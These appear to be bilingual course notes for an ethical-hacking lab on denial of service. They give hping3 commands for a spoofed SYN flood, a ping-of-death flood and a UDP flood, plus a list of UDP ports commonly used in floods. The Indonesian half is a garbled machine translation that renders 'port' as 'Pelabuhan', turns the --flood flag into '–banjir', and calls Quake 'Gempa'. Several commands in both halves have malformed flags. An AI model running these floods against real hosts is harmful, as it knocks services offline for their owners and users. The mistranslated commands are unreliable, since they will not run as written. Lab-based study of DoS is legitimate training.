# Bagian 01: DoS DDoS Concepts/Konsep DoS DDoS

**Modul 10: Denial-of-Service/Penolakan Layanan**

**Lab1-Task2: Perform a DoS Attack on a Target Host using hping3/Melakukan Serangan DoS pada Host Target menggunakan hping3**


- **Target:**
  - Wireshark-\&gt;Ethernet
- **Attacker**
  - **hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood**
    - **-S: Set the SYN flag**
    - **-a: Spoof the IP address**
    - **-p: Specify the destination port**
    - **--flood: Send a huge number of packets**
- **Target**
  - Check wireshark
- **Attacker (Perform PoD)**
  - **hping3 -d 65538 -S -p 21 –flood [Target IP]**
    - **-d: Specify data size**
    - **-S: Set the SYN flag**
- **Attacker (Perform UDP application layer flood attack)**
  - nmap -p 139 10.10.10.19 (check service)
  - **hping3 -2 -p 139 –flood [IP]**
    - **-2: Specify UDP mode**
- **Other UDP-based applications and their ports**
  - CharGen UDP Port 19
  - SNMPv2 UDP Port 161
  - QOTD UDP Port 17
  - RPC UDP Port 135
  - SSDP UDP Port 1900
  - CLDAP UDP Port 389
  - TFTP UDP Port 69
  - NetBIOS UDP Port 137,138,139
  - NTP UDP Port 123
  - Quake Network Protocol UDP Port 26000
  - VoIP UDP Port 5060

-------------------------------------------
munkin saya perlu menulisnya dalam bahasa indonesia agar dapat dipahami:

- **Target:**
 - Wireshark-\&gt;Ethernet
- **Penyerang**
 - **hping3 -S [IP Target] -a [IP Spoofable] -p 22 -flood**
 - **-S: Menyetel bendera SYN**
 - **-a: Memalsukan alamat IP**
 - **-p: Tentukan port tujuan**
 - **--flood: Mengirim paket dalam jumlah besar**
- **Target**
 - Periksa wireshark
- **Penyerang (Lakukan PoD)**
 - **hping3 -d 65538 -S -p 21 –banjir [IP Target]**
 - **-d: Tentukan ukuran data**
 - **-S: Menyetel bendera SYN**
- **Penyerang (Melakukan serangan banjir lapisan aplikasi UDP)**
 - nmap -p 139 10.10.10.19 (periksa layanan)
 - **hping3 -2 -p 139 –banjir [IP]**
 - **-2: Tentukan mode UDP**
- **Aplikasi berbasis UDP lainnya dan portnya**
 - Pelabuhan UDP CharGen 19
 -Port UDP SNMPv2 161
 -QOTD UDP Pelabuhan 17
 - RPC UDP Pelabuhan 135
 - Pelabuhan UDP SSDP 1900
 - CLDAP UDP Pelabuhan 389
 - TFTP UDP Pelabuhan 69
 - Pelabuhan UDP NetBIOS 137.138.139
 - NTP UDP Pelabuhan 123
 - Protokol Jaringan Gempa UDP Port 26000
 -VoIP UDP Port 5060

-------------------------------------------
## Konsep
Denial of service (DoS) attack/Serangan penolakan layanan (DoS).

[Definisi](../definitions/definitions_D.md#denial-of-service-serangan)

Distributed denial of service/Penolakan layanan terdistribusi

[Definisi](../definitions/definitions_D.md#distributed-denial-of-service-serangan)

Botnet

[Definisi](../definitions/definitions_B.md#botnet)

Internet relay chat (IRC)/Obrolan relai internet (IRC)

[Definisi](../definitions/definitions_I.md#internet-relay-chat)
